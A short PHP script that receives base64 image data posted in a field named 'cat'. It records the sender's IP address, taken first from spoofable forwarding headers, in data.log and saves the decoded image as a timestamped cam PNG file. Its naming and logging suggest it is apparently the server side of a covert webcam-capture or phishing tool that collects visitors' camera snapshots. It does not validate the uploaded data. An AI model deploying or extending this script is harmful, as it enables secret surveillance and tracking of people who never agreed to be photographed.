<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$date = date("dMYHis");
$imageData = $_POST['cat'];
if(!empty($_POST['cat'])){
	error_log("$ip: /cam$date.png \r\n", 3, "data.log");
}
$filterData = substr($imageData, strpos($imageData, ",")+1);
$uncodeData = base64_decode($filterData);
$fp = fopen("./cam$date.png", "wb");
fwrite($fp, $uncodeData);
fclose($fp);
?>
